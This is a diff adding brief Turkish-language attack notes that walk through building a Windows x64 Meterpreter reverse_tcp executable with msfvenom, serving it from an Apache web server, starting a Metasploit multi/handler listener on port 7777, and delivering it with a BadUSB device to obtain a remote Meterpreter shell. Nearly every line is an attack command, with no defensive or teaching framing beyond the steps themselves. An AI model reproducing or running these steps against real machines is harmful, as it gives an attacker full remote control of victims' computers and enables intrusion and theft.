@@ -1,0 +1,20 @@
+1-Payload açma
+msfvenom -l payloads
+2-daha sonra win7 kullandığımız için windows/x64/Meterpreter/reverse_tcp payloadını buluyoruz
+3- ıp bilgisini bulma
+ifconfig
+4-Payloadı oluşturuma
+mfsvenom -p windows/x64/Meterpreter/reverse_tcp lhost=ip_adresimiz lport=7777 -f exe -a x64 --platform windows -o /root/Masaüstü/hackedByOsman.exe
+5-exe dosyamızı apache servere atalım
+cp hackedByOsman.exe /var/www/html/
+service apache2 start
+msfconsole
+6- Payloadı dinlemeye alalım
+use exploit/multi/handler
+set payload windows/x64/Meterpreter/reverse_tcp
+set lhost=localip
+set lport 7777
+exploit
+payload dinlemeye alındı
+şimdi badusbyi takıp dinlemeyi kontrol edelim
+meterpreter> geldikten sonra her komutu yazabiliriz.
